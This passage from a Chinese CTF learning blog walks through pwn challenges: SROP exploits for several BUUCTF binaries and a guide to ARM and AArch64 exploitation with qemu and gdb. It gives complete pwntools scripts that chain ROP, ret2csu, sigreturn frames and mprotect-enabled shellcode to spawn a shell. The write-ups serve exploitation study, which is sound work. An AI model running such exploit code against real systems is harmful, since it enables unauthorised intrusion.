id="BUUCTF-ciscn-2019-es-7">BUUCTF_ciscn_2019_es_7</h2><p>这里我以BUUCTF上的ciscn_2019_es_7来演示一下（这道题我最开始是用ret2csu做出来的，那个WP放到了ret2csu的那篇博客上，这篇博客写一下SROP这个方法）</p><p>其实SROP的思路很简单，并且pwntools中也提供了Sigreturn Frame类来简化我们代码的编写。</p><p><img src="../img/2706180-20220220190338842-381275045.png" alt=""></p><p>这道题在主函数里只有两个系统调用，不过发现这个write系统调用时有漏洞的，它可以打印0x30个数据，可是可以看出来buf距离栈底仅仅只有0x10字节</p><p><img src="../img/2706180-20220220190344777-904593431.png" alt=""></p><p>这就意味着write是可以去泄露栈中数据的，因此我们就可以配合系统调用read来把/bin/sh写入栈里面，同时里面偏移加上泄露的栈地址，我们就可以计算出/bin/sh的地址。（这个/bin/sh偏移的计算在ret2csu中已经提过了，这里就不在赘述）</p><p>然后我们还发现了系统调用sigreturn</p><p><img src="../img/2706180-20220220190351016-2105082674.png" alt=""></p><p>这就意味着我们可以去实现SROP了</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;node4.buuoj.cn&#x27;,28000)</span></span><br><span class="line">p=process(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">e=ELF(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">csu_gadget1=<span class="number">0x40059A</span></span><br><span class="line">modify_rax=<span class="number">0x4004E2</span></span><br><span class="line">csu_gadget2=<span class="number">0x400580</span></span><br><span class="line">term_proc=<span class="number">0x600e50</span></span><br><span class="line">bss_addr=<span class="number">0x601030</span></span><br><span class="line">pop_rdi_addr=<span class="number">0x4005a3</span></span><br><span class="line">syscall_addr=<span class="number">0x400517</span></span><br><span class="line">read_syscall=<span class="number">0x4004ED</span></span><br><span class="line">mov_rax_15=<span class="number">0x4004DA</span></span><br><span class="line">kong=<span class="number">0x600e50</span></span><br><span class="line">offset=<span class="number">16</span></span><br><span class="line">payload=<span class="string">&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="number">16</span>,<span class="string">&#x27;\x00&#x27;</span>)+p64(read_syscall)<span class="comment">#这次发送的目的就是获取/bin/sh的地址</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;\x05\x40\x00\x00\x00\x00\x00&#x27;</span>)<span class="comment">#限制一下条件，确保接收的是我们要泄露的地址</span></span><br><span class="line">leak_addr=u64(p.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">bin_sh_addr=leak_addr-<span class="number">280</span><span class="comment">#这个偏移在ret2csu中计算出来了，这里不再重复提了</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(bin_sh_addr))</span><br><span class="line">frame=SigreturnFrame()<span class="comment">#接下来开始设置参数</span></span><br><span class="line">frame.rax=<span class="number">0x3b</span></span><br><span class="line">frame.rdi=bin_sh_addr</span><br><span class="line">frame.rsi=<span class="number">0</span></span><br><span class="line">frame.rdx=<span class="number">0</span></span><br><span class="line">frame.rip=syscall_addr</span><br><span class="line">payload=<span class="string">&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="number">16</span>,<span class="string">&#x27;\x00&#x27;</span>)+p64(mov_rax_15)+p64(syscall_addr)+<span class="built_in">str</span>(frame)</span><br><span class="line"><span class="comment">#这次payload的目的是把/bin/sh存到栈里，并且伪造一个Signal Frame</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="BUUCTF-ciscn-2019-s-3">BUUCTF_ciscn_2019_s_3</h2><p><img src="../img/2706180-20220222104440708-175917302.png" alt=""></p><p><img src="../img/2706180-20220222104446654-1916710342.png" alt=""></p><p>这已经很明显了，要用SROP。</p><p>先去把栈地址泄露一下。</p><p>第一次随便输入（不过最后要在返回地址上写一个vul的首地址，重新进行read）</p><p>第一次走vul就是为了write泄露地址</p><p><img src="../img/2706180-20220222104450476-1019432047.png" alt=""></p><p>我们要泄露距离栈顶第三个的内容，因为它指向了栈地址</p><p><img src="../img/2706180-20220222104454166-166128671.png" alt=""></p><p>然后发现这个地址是在32字节处被接收的</p><p>经过观察read函数，发现我们payload从0x7fffffffdf70开始存储，看一下泄露的栈地址距离这个df70的偏移</p><p><img src="../img/2706180-20220222104457644-721340483.png" alt=""></p><p>偏移拿到，然后就直接构造srop的那个payload即可，我们要保证/bin/sh在df70这个地址，然后经过调试发现这里是要填充16个字节才能到返回地址的，因此我就填了两个/bin/sh\x00，第二次填充别的也行，反正要凑齐十六个字节</p><p>Exp如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=remote(&#x27;node4.buuoj.cn&#x27;,26430)</span></span><br><span class="line">p=process(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b *&#x27;+&#x27;0x400517&#x27;)</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">vul_addr=<span class="number">0x4004ED</span></span><br><span class="line">kong=<span class="number">0x600e50</span></span><br><span class="line">modify_rax=<span class="number">0x4004DA</span></span><br><span class="line">syscall_ret_addr=<span class="number">0x400517</span></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">16</span>+p64(vul_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line">leak_addr=u64(p.recv()[<span class="number">32</span>:<span class="number">40</span>])</span><br><span class="line">target_addr=leak_addr-<span class="number">0x118</span></span><br><span class="line">frame=SigreturnFrame()</span><br><span class="line">frame.rax=<span class="number">0x3b</span></span><br><span class="line">frame.rdi=target_addr</span><br><span class="line">frame.rdx=<span class="number">0</span></span><br><span class="line">frame.rsi=<span class="number">0</span></span><br><span class="line">frame.rip=syscall_ret_addr</span><br><span class="line">frame.rsp=kong</span><br><span class="line">payload=<span class="string">&#x27;/bin/sh\x00&#x27;</span>*<span class="number">2</span>+p64(modify_rax)+p64(syscall_ret_addr)+<span class="built_in">str</span>(frame)</span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(target_addr))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>这道题其实收获最大的并不是这个正确的exp</p><p>而是下面这个错误的exp(这个exp脚本直接运行的话，是拿不到shell的，但是如果用gdb附加进程调试的话，是可以拿到shell的，因此这个exp是非常奇怪的，但它确实是错的，只不过因为巧合在调试的情况下，是正确的)</p><p>可以发现这个exp发送了三次payload</p><p>第三次和第二次payload就是在布置准备执行srop的条件</p><p>当时用gdb调试走到最后发现就可以获取shell</p><p>但是如果直接运行这个脚本就不能获取shell</p><p>卡了很久很久，最后请教了roderick师傅，最后豁然开朗，解释如下。</p><p><strong>在挂gdb的时候 第二次的read还没有执行，但是内核缓冲区的数据已经拷贝到了用户数据 意思就是说 我的第二次payload和第三次的payload现在都存到了缓冲区里面 gdb调试到了第二个read，直接就把两次的payload 都给读进去了（我又看了下调试发现却是是这样） 然后这两次的内容在一次里面修改了栈空间恰好就是对的了 但是我程序运行的时候，还是发了三次的payload</strong></p><hr><p><strong>简单来说就是就是其实我现在用gdb看的是一种假象，gdb现在调试让我看到的 是一次性发送了两个payload的情况，但事实上我程序本身运行的时候 并不是我现在gdb看到的情况</strong>**</p><p><font color=red><strong>以后这里就要注意了，如果是多个read的情况，使用gdb调试的时候要注意，避免一次read给读进去两次payload。</strong></font></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=remote(&#x27;node4.buuoj.cn&#x27;,26430)</span></span><br><span class="line">p=process(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b *&#x27;+&#x27;0x400517&#x27;)</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;pid&#x27;</span>+<span class="built_in">str</span>(proc.pidof(p)))</span><br><span class="line">vul_addr=<span class="number">0x4004ED</span></span><br><span class="line">modify_rax=<span class="number">0x4004DA</span></span><br><span class="line">syscall_ret_addr=<span class="number">0x400517</span></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">16</span>+p64(vul_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line">leak_addr=u64(p.recv()[<span class="number">32</span>:<span class="number">40</span>])</span><br><span class="line">target_addr=leak_addr-<span class="number">0x118</span></span><br><span class="line">payload=<span class="string">&#x27;/bin/sh\x00&#x27;</span>+p64(vul_addr)+p64(modify_rax)+p64(syscall_ret_addr)<span class="comment">#核心问题是在这里，此时的return直接返回到了modify_rax这个地址，没有到vul_addr这个地址，因此程序其实并没有执行第三次的输入。</span></span><br><span class="line">p.send(payload)</span><br><span class="line">frame=SigreturnFrame()</span><br><span class="line">frame.rax=<span class="number">0x3b</span></span><br><span class="line">frame.rdi=target_addr</span><br><span class="line">frame.rdx=<span class="number">0</span></span><br><span class="line">frame.rsi=<span class="number">0</span></span><br><span class="line">frame.rip=syscall_ret_addr</span><br><span class="line">payload=<span class="built_in">str</span>(frame)</span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(target_addr))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="rootersctf-2019-srop">rootersctf_2019_srop</h2><p><img src="../img/image-20221007110823863.png" alt="image-20221007110823863"></p><p>发现这里就一个输入和输出的系统调用，发现无论如何也无法泄露栈地址，因此/bin/sh直接写入栈里的话我们是不知道地址的。所以采用srop伪造两次上下文，第一次系统调用read将/bin/sh以及第二次伪造的上下文都写入data段(data段地址是固定不变的)，然后迁移到data段，进行第二次srop。</p><p>这道题控制第一次rip的gadget为syscall;leave;ret,而leave和ret指令相当于mov rbp,rsp;pop rbp;pop  rip，调试一下就发现我们控制rsp没用，要去控制rbp，在执行leave;ret的时候又将rbp给了rsp，因此第一次布置的寄存器的值中只需控制rbp即可。</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment">#p=process(&#x27;./a&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29672</span>)</span><br><span class="line">syscall_addr=<span class="number">0x0000000000401033</span></span><br><span class="line">pop_rax=<span class="number">0x0000000000401032</span></span><br><span class="line">frame=SigreturnFrame()</span><br><span class="line">frame.rax=<span class="number">0x0</span></span><br><span class="line">frame.rdi=<span class="number">0</span></span><br><span class="line">frame.rsi=<span class="number">0x402000</span></span><br><span class="line">frame.rdx=<span class="number">0x1000</span></span><br><span class="line">frame.rip=syscall_addr</span><br><span class="line">frame.rbp=<span class="number">0x402000</span>-<span class="number">8</span></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x88</span>+p64(pop_rax)+p64(<span class="number">15</span>)+<span class="built_in">str</span>(frame)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">frame=SigreturnFrame()</span><br><span class="line">frame.rax=<span class="number">0x3b</span></span><br><span class="line">frame.rdi=<span class="number">0x402108</span></span><br><span class="line">frame.rsi=<span class="number">0</span></span><br><span class="line">frame.rdx=<span class="number">0</span></span><br><span class="line">frame.rip=syscall_addr</span><br><span class="line">payload=p64(pop_rax)+p64(<span class="number">15</span>)+<span class="built_in">str</span>(frame)+<span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="../img/image-20221007110808668.png" alt="image-20221007110808668"></p>]]></content>
      
      
      <categories>
          
          <category> 学习总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SROP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于学习arm架构下的pwn的总结</title>
      <link href="/posts/536aee5b.html"/>
      <url>/posts/536aee5b.html</url>
      
        <content type="html"><![CDATA[<p>通过这段时间对于arm架构的题目学习，自认为收获还是不少的。下面是对于这段时间关于arm架构的pwn题学习所进行的总结。（我其实还想再多做几道arm架构的栈题的，可是网上所找到的实在不多，等再遇到新的arm架构题目，我再添到这篇文章上吧）</p><h1>运行程序&amp;&amp;启动调试</h1><p>咋装的环境已经忘记了…（装完环境过了一段时间才开始arm架构的学习）装配环境的话，上网搜一下文章也不少。可以参考这篇文章  <a href="https://blog.csdn.net/A951860555/article/details/116780827#_4">(26条消息) CTF pwn – ARM架构的pwn题详解___lifanxin的博客-CSDN博客</a></p><p>记录一下怎么启动以及调试arm架构的程序。</p><p>先checksec一下（或者用file命令也行），看看是什么架构的。</p><p><img src="../img/2706180-20220330143502376-463880438.png" alt=""></p><p><img src="../img/2706180-20220330143527102-656865950.png" alt=""></p><p>file命令可以查看程序是动态链接还是静态链接。</p><h2 id="运行程序">运行程序</h2><p>如果程序是静态链接并且是32位 arm架构的话，输入qemu-arm ./程序名</p><p>如果程序是静态链接并且是aarch64架构的话，输入qemu-aarch ./程序名</p><p>如果程序是动态链接且是32位 arm架构的话，输入qemu-arm -L  /usr/arm-linux-gnueabihf ./程序名</p><p>如果程序是动态链接且是aarch64架构的话，输入qemu-aarch64 -L /usr/aarch64-linux-gnu  ./程序名</p><h2 id="启动调试">启动调试</h2><p><strong>启动调试和运行程序的命令很相似，仅仅是加了一个参数-g 然后后面跟一个端口</strong>。</p><p>比如程序是动态链接的32位 arm架构的话，输入qemu-arm -g 1234 -L /usr/aarch64-linux-gnu ./程序名</p><p>这个1234是你指定的端口，指定别的端口也可以。然后参照运行程序那四个命令以及上面这个命令，就可以依次类推出调试aarch64架构的命令了。</p><p>此时再打开另一个终端，输入gdb-multiarch（<strong>必须是用pwndbg，如果是peda的话，是没法正常调试的</strong>）</p><p>然后再输入target remote localhost:1234   连接到刚才开的那个端口。</p><p><img src="../img/2706180-20220330143540210-194090059.png" alt=""></p><p>进入调试效果如图</p><p><img src="../img/2706180-20220330143550778-303416150.png" alt=""></p><p>不知道为啥，arm架构进去调试似乎不是从main函数开始的，如果单步的话需要走很久很久，可以进去之后用b在想停留的那个地方下个断点，然后c过去，这样会快很多。</p><h2 id="遇见的报错">遇见的报错</h2><p>1、如果32位遇见这个报错的话：/lib/ld-linux-armhf.so.3: No such file or directory</p><p>输入命令sudo apt-get install libc6-armhf-cross</p><p>2、如果遇见这个报错的话：Invalid ELF image for this architecture</p><p>就说明你的qemu后面跟的参数不对，就比如你这个程序是aarch64架构的，但是你qemu后面跟的是-arm。如果你这个程序是aarch64架构的，正确做法应该是qemu后面跟着-aarch64</p><p>然后关于arm架构下的指令，在网上能搜到很多，也解释的比较清楚，我就不在这里赘述了。</p><p>下面三道例题（其实我是想多写几道的，但是在网上找到可下载的题目只有这三道（还有个堆题，等学堆了再做））的下载链接：</p><p>链接: <a href="https://pan.baidu.com/s/1dRbm8k5qup7Anj9UDrsBlA?pwd=ecpr">https://pan.baidu.com/s/1dRbm8k5qup7Anj9UDrsBlA?pwd=ecpr</a> 提取码: ecpr</p><h1>typo</h1><h2 id="总结：">总结：</h2><p>通过这道题的收获与学习有：</p><p>1、这是做的第一道arm架构的题目，考察的就是最简单的rop，学习到了arm32的寄存器传参方式，以及最简单的rop利用。</p><p>2、在面对静态链接的程序，IDA打开之后会发现里面有几百个函数，而且也搜不到main函数，在这种情况下，可以利用搜<strong>索关键字符串，通过关键字符串去找主函数</strong>。</p><p>3、不知道是不是我的错觉，在考察简单的rop情况下，似乎师傅们都没有去花很多的精力去查看ida生成的伪代码（确实伪代码太多了），直接gdb打开看完偏移就是干。</p><p>4、在面对静态链接的程序，从ida中分析可能会异常的麻烦，如果有可能的话，其实可以靠输入内容之后观察程序的回显，猜测一些程序功能。</p><h2 id="保护策略">保护策略</h2><p><img src="../img/2706180-20220330143602189-496528067.png" alt=""></p><h2 id="IDA分析">IDA分析</h2><p>打开IDA之后，可以发现是静态链接，旁边有非常多的函数，难以迅速定位到主函数。因此采用一种比较好用的方法。</p><p>先运行一下这个程序，发现有这种字符串</p><p><img src="../img/2706180-20220330143615732-1043244594.png" alt=""></p><p>那就在IDA里面用shift+F12，查看一下这个字符串。</p><p><img src="../img/2706180-20220330143624039-802565433.png" alt=""></p><p>然后看一下引用，如此就可以找到主函数了</p><p><img src="../img/2706180-20220330143632149-590724454.png" alt=""></p><p>跳到汇编代码处，F5一下，即可看到主函数的伪代码（直接搜main函数的话，也是搜不到的）</p><p><img src="../img/2706180-20220330143641480-1941741546.png" alt=""></p><p>直接看伪代码有点懵，先输入一些垃圾数据（第一次必须要输入一个回车），看看是否存在溢出</p><p><img src="../img/2706180-20220330143649674-663002508.png" alt=""></p><p>发现段错误了，那就说明存在溢出。然后用gdb调试一下，看看溢出是多少。</p><p>最初我企图用gdb单步到输入函数，然后输入垃圾数据，不过单步了很久发现依旧没有到可输入的地方，通过去看其他师傅的博客，发现了一个方便的方法。<strong>我们启动gdb之后直接输入c。c的本意是去continue到下一个断点，可是我们压根就没有下断点，因此能让这个continue停下的办法就是碰到输入函数</strong>（这一招确实妙啊）。</p><p><img src="../img/2706180-20220330143659812-841662687.png" alt=""></p><p>我们第一次先输入一个回车</p><h3 id="插入一点：如果不输入回车呢？">插入一点：如果不输入回车呢？</h3><p>不输入回车，去输入别的内容的话，程序会将我们输入的内容丢弃第一个字符，从而把后面的内容去当做命令处理。<br><img src="../img/2706180-20220330143706504-722501017.png" alt=""></p><p>可以发现第一次输入了个kkkkkkkkk，结果报了一个command not found。那就说明这个程序试图将我们输入的内容当做命令执行。</p><p><img src="../img/2706180-20220330143715763-1494112878.png" alt=""></p><p>可是我们输入ls的话，它说s这个命令没有被执行，由此猜测，第一个字符被丢弃了。</p><p><img src="../img/2706180-20220330143723931-1908764069.png" alt=""></p><p>结合上图发现，事实确实如此，可是这样就发现我们输入的内容当做指令执行的话，程序就结束了，因此我们尝试只输入一个回车看看会怎么样？</p><p><img src="../img/2706180-20220330143730693-1862644172.png" alt=""></p><p>程序开始继续运行了。而且值得一提的是，人家英语也说了，按下回车键就会开始。</p><p>继续回归正题</p><p>怎么去确定偏移量？我们采用cyclic去确定输入点距离返回地址的偏移。</p><p><img src="../img/2706180-20220330143740365-728718642.png" alt=""></p><p>用cyclic填充两百个字符，然后用cyclic -l得到偏移。</p><p><img src="../img/2706180-20220330143748777-307977432.png" alt=""></p><p>因为这是静态链接，因此我们可以很轻松的去里面拿到我们想要的/bin/sh参数和system函数。</p><p>事实上我们没有办法搜到system函数，但是猜测一下，system会调用/bin/sh，因此我们先去找一下/bin/sh</p><p><img src="../img/2706180-20220330143816463-469510505.png" alt=""><br><img src="../img/2706180-20220330143825159-977323706.png" alt=""></p><p><strong>如果你的IDA没有出现上面红框里面的内容，就说明IDA还没有把所有的数据装载完，等一会就行了。</strong></p><p>然后点上面红色框跳转过来，就是这个函数。</p><p><img src="../img/2706180-20220330143834126-1105741162.png" alt=""></p><p>虽然我看不出来他是个system函数，但是有关系嘛？没有关系。如此，system函数的地址就是 0x10ba8</p><p><img src="../img/2706180-20220330143844765-114030552.png" alt=""></p><h2 id="arm架构的基本知识">arm架构的基本知识</h2><h3 id="arm32位">arm32位</h3><p>这个arm32位的话，<strong>传前四个参数是用的r0~r3寄存器</strong>，如果<strong>参数再多的话，就利用栈传参</strong>（从右向左依次入栈）。<strong>函数的返回值会存在r0寄存器</strong>中。然后<strong>pc寄存器就相当于x86中的eip寄存器</strong>（始终装的都是我们下一条指令执行的地址）除此之外，<strong>arm 的 b/bl 等指令实现跳转</strong>。</p><p>因此我们就先去看看有什么可以控制r0寄存器的gadget。</p><p><img src="../img/2706180-20220330143857152-1288308186.png" alt=""></p><p>这个pop r0 r4 pc就很nice。</p><p>r4我们随便填充，pc你可以理解为ret的效果。然后payload格式跟x86的差不多。</p><h2 id="EXP：">EXP：</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&#x27;./typo&#x27;</span>)</span><br><span class="line">offset=<span class="number">112</span></span><br><span class="line">pop_r0_r4_pc_addr=<span class="number">0x00020904</span></span><br><span class="line">bin_sh_addr=<span class="number">0x0006c384</span></span><br><span class="line">sys_addr=<span class="number">0x00010BA8</span></span><br><span class="line">p.send(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">payload=offset*<span class="string">&#x27;a&#x27;</span>+p32(pop_r0_r4_pc_addr)+p32(bin_sh_addr)+p32(<span class="number">0</span>)+p32(sys_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()                 </span><br></pre></td></tr></table></figure><h1>Shanghai2018 – baby_arm</h1><h2 id="总结：-v2">总结：</h2><p>通过这道题的学习与收获有：</p><p>1、这道题也算是学习了arrch64架构下的ret2csu，与x86中的区别其实并不大。</p><p>2、mprotect函数去修改内存属性，从而执行shellcode</p><h2 id="保护策略：">保护策略：</h2><p><img src="../img/2706180-20220330143907318-655446132.png" alt=""></p><h2 id="程序分析：">程序分析：</h2><p><img src="../img/2706180-20220330143915394-2016812350.png" alt=""></p><p>程序逻辑很简单，read一次输入，输入到bss段，没法溢出。然后sub_4007F0函数也有一次输入，输入到栈里，存在溢出。</p><p><img src="../img/2706180-20220330143923115-1537780362.png" alt=""></p><p>同时程序中存在一个mprotect函数。</p><h2 id="解题过程：">解题过程：</h2><h3 id="劫持执行流">劫持执行流</h3><p>这道题发现在第二个read结束后，我们的数据并不能覆盖返回地址（此时返回地址在我们输入数据的上面）（如下图）</p><p><img src="../img/2706180-20220330143934847-349157649.png" alt=""></p><p>不过我们发现在0x400860的地方还有一个ret，我们单步到这个ret看看，此时的x30是什么。</p><p><img src="../img/2706180-20220330143941968-684243399.png" alt=""></p><p>可以发现此时的x30，就是距离栈顶为2的内容，而这个内容对应的栈地址0x40007fffb8则是在我们第二次read输入的起始地址下面，也就是说我们可以控制这个地址，从而来劫持程序的执行流。</p><h3 id="ret2csu">ret2csu?</h3><p>由于mprotect函数可以改变内存的属性，本来这道题是bss段是只能写的，不过我们可以用mprotect将bss段变成可执行，然后往里面输入个shellcode就ok了。怎么控制mprotect的参数？</p><p>我们发现，arm架构下，也有一段汇编可以控制寄存器参数（完全可以把这段当成x86中的csu）</p><p><img src="../img/2706180-20220330143950123-1357024283.png" alt=""></p><p>先分析下面的loc_4008cc的内容</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">LDP             X19, X20, [SP,#var_s10]</span><br><span class="line">LDP             X21, X22, [SP,#var_s20]</span><br><span class="line">LDP             X23, X24, [SP,#var_s30]</span><br><span class="line">LDP             X29, X30, [SP+var_s0],#0x40                </span><br><span class="line">RET</span><br></pre></td></tr></table></figure><p>第一句这个LDP         X19, X20, [SP,#var_s10]就是说将SP+0x10所指向的内容给x19和x20寄存器（x19寄存器拿的是SP+0x10所指向的内容，而x20寄存器拿的是SP+0x18所指向的内容）</p><p>然后第四句这个LDP         X29, X30, [SP+var_s0],#0x40的意思是将SP所指向的内容给x29和x30寄存器（x29寄存器拿的是SP所指向的内容，而x30寄存器拿的是SP+0x8所指向的内容），完成这句指令之后，再将SP指针增加0x40个字节。</p><p>然后ret，这个就是返回到x30寄存器所存储的值。</p><p>再结合着刚刚分析的内容，来看一下loc_4008ac的内容。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">LDR             X3, [X21,X19,LSL#3]</span><br><span class="line">MOV             X2, X22</span><br><span class="line">MOV             X1, X23</span><br><span class="line">MOV             W0, W24</span><br><span class="line">ADD             X19, X19, #1</span><br><span class="line">BLR             X3</span><br><span class="line">CMP             X19, X20</span><br><span class="line">B.NE            loc_4008AC</span><br></pre></td></tr></table></figure><p>第一句就是说将x19的值逻辑左移3位，然后加上x21的值，将得到的这个值所指向内容给x3寄存器。（如果我们控制x19的值为0的话，就是说把x21寄存器的值所指向的内容给x3寄存器。</p><p>然后剩下的mov，add就没什么好说的了。</p><p>倒数第三行BLR指令是去跳转到X3寄存器的值，同时把下一个指令的地址存到x30里面。</p><p>然后下面的CMP和x86里面的一样了。</p><p>如此思路就出来了，几乎是跟ret2csu的利用方法一样。有两点需要注意一下。第一点就是loc_4008cc中的</p><p>LDP             X29, X30, [SP+var_s0],#0x40    这个指令，虽然<strong>它是在这个loc_4008cc函数的最后，但是它传给x29和x30寄存器的时候，拿的是栈顶的值。因此布置栈中数据的时候，栈顶的内容应该是存放的x29和x30的值。</strong></p><p>第二点，<strong>是BLR X3的时候，这个X3的值溯源一下，它是由X21充当指针来指向的，而X21的值又是SP+0x20充当指针来指向的。意思就是说，我们最终想跳转的内容必须被指针的指针所指向，因此考虑的是将X3的内容放在bss段，然后X21去存储bss段的地址（指向X3的内容），然后再把X21的值布置在栈里面</strong>。最后X3的值放入mprotect的plt地址即可（<strong>因为BLR跳的话，直接跳到了寄存器的值处，因此这里应该放的是plt地址（要求这个地址装的就是指令）</strong>，got地址（装的是got表，而got表中装的才是指令）是用于指针寻址跳转的情况，当时在这里迷了一下）。</p><h2 id="EXP">EXP</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;aarch64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26705</span>)</span><br><span class="line">e=ELF(<span class="string">&#x27;./zhengchang&#x27;</span>)</span><br><span class="line">mprotect_got=e.got[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">mprotect_plt=e.plt[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">offset=<span class="number">0x48</span></span><br><span class="line">bss_addr=<span class="number">0x411068</span></span><br><span class="line">csu1=<span class="number">0x4008CC</span></span><br><span class="line">csu2=<span class="number">0x4008AC</span></span><br><span class="line">shellcode=asm(shellcraft.aarch64.sh())</span><br><span class="line">shellcode=shellcode.ljust(<span class="number">0x100</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">shellcode+=p64(mprotect_plt)</span><br><span class="line">payload1=shellcode</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Name:&#x27;</span>,payload1)</span><br><span class="line">payload2=offset*<span class="string">&#x27;a&#x27;</span>+p64(csu1)</span><br><span class="line">payload2+=p64(<span class="number">0</span>)+p64(csu2) <span class="comment">#x29 x30</span></span><br><span class="line">payload2+=p64(<span class="number">0</span>)+p64(<span class="number">1</span>) <span class="comment">#x19 x20</span></span><br><span class="line">payload2+=p64(bss_addr+<span class="number">0x100</span>)+p64(<span class="number">7</span>)<span class="comment">#x21 x22  分别赋值给了x3 x2</span></span><br><span class="line">payload2+=p64(<span class="number">0x1000</span>)+p64(<span class="number">0x411000</span>)<span class="comment">#x23 x24  分别赋值给了x1 w0</span></span><br><span class="line">payload2+=p64(<span class="number">0</span>)+p64(bss_addr)<span class="comment">#x29 x30</span></span><br><span class="line">payload2+=p64(<span class="number">0</span>)+p64(<span class="number">0</span>)<span class="comment">#x19 x20</span></span><br><span class="line">payload2+=p64(<span class="number">0</span>)+p64(<span class="number">0</span>)<span class="comment">#x21 x22</span></span><br><span class="line">payload2+=p64(<span class="number">0</span>)+p64(<span class="number">0</span>)<span class="comment">#x23 x24</span></span><br><span class="line">pause()</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1>inctf2018_wARMup</h1><h2 id="总结">总结:</h2><p>通过这道题的学习与收获有：</p><p>1、arm架构（32位）的bss段是可执行的！</p><p>2、这道题考察的是栈迁移，以及通过调试来确定payload的布局。这道题是比较锻炼调试能力的（至少对于现在的我来说），锻炼调试能力，我指的是不看exp的情况下，自己做这道题…</p><p>3、现在也做了三道arm架构的题了，说实话和x86下的区别不大。只要熟悉x86的做题思路，做这种题，应该很快就能适应。</p><h2 id="保护策略：-v2">保护策略：</h2><p><img src="../img/2706180-20220330144006717-745739803.png" alt=""></p><h2 id="程序分析：-v2">程序分析：</h2><p><img src="../img/2706180-20220330144021409-2027396437.png" 